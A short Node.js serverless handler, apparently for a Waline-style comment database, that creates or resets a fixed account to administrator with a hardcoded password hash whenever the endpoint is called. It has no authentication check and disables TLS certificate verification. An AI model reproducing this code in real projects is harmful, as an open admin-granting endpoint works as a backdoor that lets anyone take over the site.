const connectionString = process.env.POSTGRES_URL_NON_POOLING || process.env.POSTGRES_URL;

module.exports = async (req, res) => {
  const { Pool } = require('pg');
  const pool = new Pool({ connectionString, ssl: { rejectUnauthorized: false } });
  try {
    const hash = '$2a$08$XIp4qGLsRBLFz3P3JDghferUf5SuLPDRSoNyVscddh8Efip9yqtRS';
    const existing = await pool.query("SELECT id FROM wl_users WHERE email = 'andy@pibizh.com'");
    if (existing.rows.length > 0) {
      await pool.query("UPDATE wl_users SET password = $1, type = 'administrator' WHERE email = 'andy@pibizh.com'", [hash]);
    } else {
      await pool.query("INSERT INTO wl_users (display_name, email, password, type, createdat, updatedat) VALUES ('Andy', 'andy@pibizh.com', $1, 'administrator', NOW(), NOW())", [hash]);
    }
    const check = await pool.query("SELECT id, display_name, email, type FROM wl_users WHERE email = 'andy@pibizh.com'");
    res.status(200).json({ ok: true, user: check.rows[0] });
  } catch(e) {
    res.status(500).json({ error: e.message });
  } finally {
    await pool.end();
  }
};
